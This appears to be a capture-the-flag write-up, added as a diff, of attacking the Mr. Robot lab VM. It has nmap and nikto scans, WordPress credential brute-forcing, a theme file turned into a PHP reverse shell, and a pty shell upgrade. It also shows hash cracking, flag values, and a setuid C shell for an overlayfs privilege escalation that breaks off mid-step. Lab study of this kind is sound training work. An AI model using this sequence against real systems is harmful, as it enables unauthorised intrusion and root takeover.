@@ -1,0 +1,97 @@
+sudo nmap -sS -sV 192.168.1.12
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-31 00:23 -03
+Nmap scan report for 192.168.1.12
+Host is up (0.00028s latency).
+Not shown: 997 filtered tcp ports (no-response)
+PORT    STATE  SERVICE  VERSION
+22/tcp  closed ssh
+80/tcp  open   http     Apache httpd
+443/tcp open   ssl/http Apache httpd
+MAC Address: 08:00:27:66:0E:D4 (Oracle VirtualBox virtual NIC)
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 17.26 seconds
+
+----------------------------------------------------------------------------------
+http goes to a web app:
+	request headers:
+		- Cookie 	s_fid=2F354B9E35C13E0F-24240F9E566AC719; s_nr=1711315828571; s_cc=true; s_sq=%5B%5BB%5D%5D
+	response headers:
+		- Server: Apache
+		- X-Mod-Pagespeed: 1.9.32.3-4523
+
+found hitting with curl:
+	- USER_IP='208.185.115.6'
+		
+----------------------------------------------------------------------------------
+nikto scan:
+	- x-powered-by header: PHP/5.5.29
+	- /admin/: This might be interesting
+    - /wordpress/: A Wordpress installation was found
+    - /#wp-config.php#: #wp-config.php# file found. This file contains the credentials
+    - /index: Uncommon header 'tcn' found, with contents: list
+    - /wp-login/: Cookie wordpress_test_cookie created without the httponly flag
+    - /wp-admin/wp-login.php: Wordpress login found
+    - /blog/wp-login.php: Wordpress login found.
+    - /wordpress/wp-login.php
+
+----------------------------------------------------------------------------------
+found at robots.txt:
+	User-agent: *
+	fsocity.dic
+	key-1-of-3.txt
+
+----------------------------------------------------------------------------------
+from wp-links-opml.php:+
+	- <!-- generator="WordPress/4.3.33" -->
+	- <title>Links for user&#039;s Blog!</title>
+
+----------------------------------------------------------------------------------
+192.168.1.12/phpmyadmin -> For security reasons, this URL is only accessible using localhost (127.0.0.1) as the hostname.
+
+----------------------------------------------------------------------------------
+wp-scan found credentials:
+
+	[SUCCESS] - elliot / 	ER28-0652
+----------------------------------------------------------------------------------
+after login
+
+	found media library:
+		- maybe upload php rev shell?
+	
+	found on users:
+		user mich05654 (kgordon@therapist.com, Krista Gordon): pass -> 4KodZaj!X3LqQs9M^ywWH4og
+			- interesting description: another key?
+	
+----------------------------------------------------------------------------------
+- on the appearence menu, in the editor, edited header file to be a php rev shell, fired up netcat and reloaded the page:
+   → got shell
+- in the shell, executed python script to get real shell
+   → python -c 'import pty; pty.spawn("/bin/bash");'
+- found 2 files in /home/robot:
+   → the second key and a file with user and md5 encrypted password (login as robot):
+      ⇒ cracking the md5 on crackstation found the following password: abcdefghijklmnopqrstuvwxyz
+- logged as robot and found the second key: 822c73956184f694993bede3eb39f959
+
+----------------------------------------------------------------------------------
+enumerating the os:
+	Linux linux 3.13.0-55-generic #94-Ubuntu SMP Thu Jun 18 00:27:10 UTC 2015 x86_64 x86_64 x86_64 GNU/Linux
+	
+looking for exploits for this kernel version to priv escalate:
+	found overlayfs vuln on vulnhub: https://www.exploit-db.com/exploits/37293
+	
+	tryed this known exploit:
+		created c file:
+			cat << EOF > pv.c
+			int main(void) {
+				setgid(0); setuid(0);
+				system("/bin/sh");
+			}
+			
+			gcc -o pv pv.c
+			chmod +x pv
+			
+			cat << EOF > update
+			#! /bin/bash
+			chown root.root /tmp/pv
+			chmod u+s /tmp/pv
